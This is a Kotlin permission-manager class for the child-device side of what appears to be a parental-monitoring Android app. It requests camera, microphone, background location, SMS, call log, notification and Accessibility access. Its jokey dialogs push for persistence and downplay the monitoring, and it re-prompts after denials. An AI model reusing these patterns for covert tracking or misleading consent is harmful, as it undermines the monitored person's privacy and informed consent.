package com.soumo.child.permissions

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.soumo.child.utils.BatteryOptimizationHelper

/**
 * `PermissionManager` orchestrates the entire permission workflow for the app.
 * It first requests all required foreground permissions (camera, audio, location, etc.).
 * If the device runs Android Q or higher, it then requests background location access
 *   – but only after the fine location permission has been granted.
 * Finally, it handles special permissions such as ignoring battery optimizations
 *   and enabling the Accessibility Service, providing callbacks to report the
 *   overall permission outcome to the caller.
 */

class PermissionManager(private val activity: Activity) { // Activity context is needed for permission requests and dialogs
    companion object { // Request codes for permission requests
        const val REQUEST_FOREGROUND = 1001 // Request code for foreground permissions
        const val REQUEST_BACKGROUND = 1002 // Request code for background location permission
    }

    private val foregroundPermissions: List<String> = buildList { // List of foreground permissions to request
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // Only for Android 13 and above
            add(Manifest.permission.POST_NOTIFICATIONS) // Request notification permission
        }
        add(Manifest.permission.CAMERA) // Camera permission
        add(Manifest.permission.RECORD_AUDIO) // Microphone permission
        add(Manifest.permission.ACCESS_FINE_LOCATION) // Fine location permission
        add(Manifest.permission.ACCESS_COARSE_LOCATION) // Coarse location permission
        add(Manifest.permission.READ_CALL_LOG) // Call log permission
        add(Manifest.permission.READ_SMS) // SMS permission
    }

    fun startPermissionFlow() { // Start the permission request flow
        val denied = foregroundPermissions.filter {
            ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED // Check if permission is denied
        }
        if (denied.isNotEmpty()) { // If any foreground permission is denied
            ActivityCompat.requestPermissions(activity, denied.toTypedArray(), REQUEST_FOREGROUND) // Request foreground permissions
        } else {
            requestBackgroundLocationIfNeeded() // Request background location if needed
            requestSpecialPermissions() // Request special permissions
        }
    }

    private fun requestBackgroundLocationIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) { // Only for Android Q and above
            val fineLocGranted =
                ContextCompat.checkSelfPermission(activity, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED // Check if fine location is granted
            val bgGranted =
                ContextCompat.checkSelfPermission(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED // Check if background location is granted
            if (fineLocGranted && !bgGranted) { // Only request if fine location is granted and background is not
                ActivityCompat.requestPermissions( // Request background location permission
                    activity,
                    arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
                    REQUEST_BACKGROUND // Request code for background location
                )
            }
        }
    }

    private fun requestSpecialPermissions() { // Battery optimization ignore and accessibility
        if (!BatteryOptimizationHelper.isIgnoringBatteryOptimizations(activity)) { // Check if not already ignoring
            showBatteryOptimizationDialog() // Show dialog to explain why
        }
        requestAutoStartPermission() // Request auto-start permission if needed
        requestAccessibilityPermission() // Request Accessibility Service permission
        requestNotificationListenerPermission() // Request Notification Listener permission
    }

    // ---- Delegates to BatteryOptimizationHelper ----

    private fun showBatteryOptimizationDialog() { // Show custom dialog before requesting
        AlertDialog.Builder(activity) // Use AlertDialog to explain
            .setTitle("⚡ Power Boost Needed ⚡")
            .setMessage(
                """
            To keep running at full strength in the background, 
            this app needs to be excluded from Battery Optimization. 🔋
            
            Tap “Grant” and you’ll be taken to the right screen. 
            Just set this app to, no battery restrictions and boom — we stay alive forever. 🚀
            
            (Don’t worry, we won’t eat your battery... just snacks 🍫)
            """.trimIndent() // Emojis make everything better, right? 😊
            )
            .setPositiveButton("Grant") { _, _ -> // On "Grant", try to request
                try {
                    BatteryOptimizationHelper.requestDisableBatteryOptimization(activity) // Request to disable optimizations
                    // optional: also open settings after request in case request dialog is skipped
                    activity.window.decorView.postDelayed({ // slight delay to ensure previous intent is processed first
                        BatteryOptimizationHelper.openBatteryOptimizationSettings(activity) // Open settings as fallback
                    }, 1500) // 1.5 second delay
                } catch (_: Exception) { // Catch any exception (e.g. ActivityNotFound)
                    // If something goes wrong, just open the settings screen directly
                    BatteryOptimizationHelper.openBatteryOptimizationSettings(activity) // Open settings directly
                }
            }
            .setNegativeButton("Not now") { dialog, _ -> // On "Not now", just dismiss
                dialog.dismiss() // User chose not to grant, just dismiss
            }
            .setCancelable(false) // Force user to choose
            .show() // Show the dialog
    }

    private fun requestAutoStartPermission() { // Some manufacturers require enabling auto-start manually
        if (BatteryOptimizationHelper.shouldShowAutoStartInstructions()) { // Check if we should show instructions
            Toast.makeText(activity, BatteryOptimizationHelper.getAutoStartInstructions(), Toast.LENGTH_LONG).show() // Show toast with instructions
            BatteryOptimizationHelper.openAutoStartSettings(activity) // Open the auto-start settings screen
        }
    }

    private fun requestAccessibilityPermission() { // Show dialog to enable Accessibility Service
        if (!isAccessibilityServiceEnabled(activity)) { // Check if service is not already enabled
            AlertDialog.Builder(activity) // Use AlertDialog to explain
                .setTitle("Enable Accessibility") // Title with emoji
                .setMessage("🤚 Heads up! 🖐️\n\nTo unlock full background powers, this app needs Accessibility Service permission.\n\nHit “Grant” and you’ll be teleported to the Accessibility settings. Just flip the switch to allow, and you’re done. 🫡\n\n \n\n(No worries, we don’t read your chats or steal your pizza. 🍕 But the parent would. 🤫)")
                .setPositiveButton("Grant") { _, _ -> // On "Grant", open settings
                    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS) // Intent to open Accessibility settings
                    activity.startActivity(intent)
                }
                .setNegativeButton("Cancel", null) // On "Cancel", do nothing
                .setCancelable(false) // Force user to choose
                .show() // Show the dialog
        }
    }

    private fun requestNotificationListenerPermission() { // Show dialog to enable Notification Listener
        if (!isNotificationServiceEnabled(activity)) { // Check if service is not already enabled
            AlertDialog.Builder(activity) // Use AlertDialog to explain
                .setTitle("Enable Notification Access") // Title with emoji
                .setMessage(
                    "🔔 Heads up!\n\nTo monitor app notifications (like messages and alerts), " +
                            "this app needs Notification Access.\n\n" +
                            "Hit “Grant” and you’ll be taken to the settings screen — just enable the toggle for this app. 🫡"
                )
                .setPositiveButton("Grant") { _, _ ->
                    try { // On "Grant", open settings
                        val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS") // Intent to open Notification Listener settings
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) // New task flag
                        activity.startActivity(intent) // Start the settings activity
                    } catch (e: Exception) { // Catch any exception (e.g. ActivityNotFound)
                        e.printStackTrace() // Log the exception
                        Toast.makeText(activity, "Unable to open settings. Please enable manually.", Toast.LENGTH_LONG).show() // Inform user
                    }
                }
                .setNegativeButton("Cancel", null) // On "Cancel", do nothing
                .setCancelable(false) // Force user to choose
                .show() // Show the dialog
        }
    }

    /**
     * Check if Notification Listener permission is granted.
     */
    private fun isNotificationServiceEnabled(context: Context): Boolean { // Check if our Notification Listener is enabled
        val packageName = context.packageName // Get our package name
        val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners") // Get enabled listeners
        return flat?.contains(packageName) == true // Return true if our package is in the enabled listeners list
    }


    private fun isAccessibilityServiceEnabled(context: Context): Boolean { // Check if our Accessibility Service is enabled
        val prefString = Settings.Secure.getString(context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
        val packageName = context.packageName
        return prefString?.contains(packageName) == true // Return true if our package is in the enabled services list
    }

    // ---- Permission results ----

    fun onRequestPermissionsResult( // Handle permission request results
        requestCode: Int, // Request code to identify which request
        callback: (allGranted: Boolean) -> Unit, // Callback to report if all permissions are granted
    ) {
        when (requestCode) {
            REQUEST_FOREGROUND -> { // After foreground permissions request
                val stillDenied = foregroundPermissions.filter { // Check which foreground permissions are still denied
                    ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED // Not granted
                }
                if (stillDenied.isEmpty()) { // If none are denied
                    requestBackgroundLocationIfNeeded() // Request background location if needed
                    requestSpecialPermissions() // Request special permissions
                    callback(allPermissionsGranted()) // Report overall status
                } else {
                    handleDeniedPermissions(stillDenied) // Handle any denied permissions
                    callback(false) // Report not all granted
                }
            }
            REQUEST_BACKGROUND -> { // After background location request
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) { // Only relevant for Android Q and above
                    val granted = ContextCompat.checkSelfPermission(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED // Check if background location granted
                    if (!granted) { // If not granted
                        handleDeniedPermissions(listOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)) // Handle denial
                        callback(false) // Report not all granted
                    } else {
                        callback(allPermissionsGranted()) // Report overall status
                    }
                } else {
                    callback(allPermissionsGranted()) // For older versions, just report overall status
                }
            }
            else -> callback(allPermissionsGranted()) // For any other request code, just report overall status
        }
    }

    private fun handleDeniedPermissions(denied: List<String>) { // Handle denied permissions
        // Check if we should show rationale for any denied permission
        val shouldShowRationale = denied.any { ActivityCompat.shouldShowRequestPermissionRationale(activity, it) } // Check if we should show rationale
        if (shouldShowRationale) { // If we should show rationale
            AlertDialog.Builder(activity) // Use AlertDialog to explain
                .setTitle("Permissions Needed")
                .setMessage("To unlock full background powers, this app needs all requested permissions. Please grant them in the next prompt.")
                .setPositiveButton("Retry") { _, _ -> // On "Retry", request again
                    ActivityCompat.requestPermissions(activity, denied.toTypedArray(), REQUEST_FOREGROUND)
                }
                .setNegativeButton("Cancel", null) // On "Cancel", do nothing
                .setCancelable(false) // Force user to choose
                .show() // Show the dialog
        } else { // If user selected "Don't ask again" or similar
            Toast.makeText(activity, "Some permissions were denied permanently. Please enable them from app settings for full functionality.", Toast.LENGTH_LONG).show() // Show toast informing user
            // Optionally, guide user to app settings to enable permissions manually
            ActivityCompat.requestPermissions(activity, denied.toTypedArray(), REQUEST_FOREGROUND) // Retry requesting to show system dialog again
        }
    }

    fun allPermissionsGranted(): Boolean { // Check if all required permissions are granted
        for (p in foregroundPermissions) { // Check each foreground permission
            if (ContextCompat.checkSelfPermission(activity, p) != PackageManager.PERMISSION_GRANTED) return false // If any is not granted, return false
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) { // For Android Q and above, check background location
            if (ContextCompat.checkSelfPermission(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) return false // If background location not granted, return false
        }
        if (!isNotificationServiceEnabled(activity)) return false // Check if Notification Listener is enabled
        return isAccessibilityServiceEnabled(activity) // Finally, check if Accessibility Service is enabled
    }
}
/** * Note: This class assumes it is used within an Activity context.
 * It handles permission requests and results, including special permissions.
 * The caller (e.g. MainActivity) should delegate onRequestPermissionsResult to this class.
 * The overall permission status is reported via the provided callback.
 */